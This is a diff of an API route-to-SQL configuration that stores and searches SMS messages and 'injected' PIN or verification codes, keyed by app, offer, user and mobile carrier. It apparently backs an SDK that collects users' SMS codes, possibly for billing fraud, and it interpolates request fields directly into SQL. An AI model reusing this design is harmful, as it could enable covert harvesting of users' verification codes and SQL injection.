@@ -57,11 +57,11 @@ GET /api/permissions/tootalPV: |
 #短信表插入
 POST /api/pins/getIde: INSERT INTO pinCodeCollects (appId,offerId,userId,requestId,pinInject,message,uploadTime) VALUES (${data.appId},${data.offerId},${data.userId},${data.requestId},${data.pinInject},${data.message},${data.uploadTime});
 POST /api/pin/getIde: INSERT INTO pinCodeCollect (appId,offerId,userId,requestId,pinInject,message,uploadTime) VALUES (${data.appId},${data.offerId},${data.userId},${data.requestId},${data.pinInject},${data.message},${data.uploadTime});
-#短信更新
-POST /api/pinInjects/getIde: update pinCodeCollects set pinInject=${data.pinInject} WHERE requestId = ${data.requestId};
-POST /api/pinInject/getIde: update pinCodeCollect set pinInject=${data.pinInject} WHERE requestId = ${data.requestId};
+#验证码插入
+POST /api/pinInjects/getIde: INSERT INTO pinInjectCollect (requestId,pinInject,uploadTime) VALUES (${data.requestId},${data.pinInject},NOW())
+POST /api/pinInject/getIde: INSERT INTO pinInjectCollects (requestId,pinInject,uploadTime) VALUES (${data.requestId},${data.pinInject},NOW())
 #短信搜索
-GET /api/pinInject/getMassages: SELECT appId,requestId,offerId,userId,pinInject,message,from_unixtime(uploadTime/1000, '%Y-%m-%d %H:%i:%S') AS uploadTime FROM pinCodeCollect WHERE appId = ${data.appId} AND offerId = ${data.offerId} AND uploadTime < @{data.timeEnd} AND uploadTime >= @{data.timeStart} ORDER BY uploadTime DESC,userId;
+GET /api/pinInject/getMassages: SELECT appId,requestId,offerId,userId,p.pinInject,message,uploadTime FROM (SELECT appId,requestId,offerId,userId,message,FROM_UNIXTIME(uploadTime/1000, '%Y-%m-%d %H:%i:%S') AS uploadTime FROM pinCodeCollect WHERE appId = ${data.appId} AND offerId = ${data.offerId} AND uploadTime < @{data.timeEnd} AND uploadTime >= @{data.timeStart} ORDER BY uploadTime DESC,userId) ps LEFT JOIN (SELECT pinInject,requestId FROM  pinInjectCollect) p ON p.requestId =ps.requestId;
 #根据APPid 获取运营商
 GET /api/permissions/getCarrier: 
   SELECT p.carrier,s.appId FROM (SELECT carrier,requestId FROM permissionCollect WHERE !ISNULL(carrier)) p LEFT JOIN (SELECT appId,requestId FROM sdkOfferCollect WHERE appId = ${data.appId}) s ON s.requestId = p.requestId WHERE !ISNULL(s.appId) GROUP BY p.carrier;
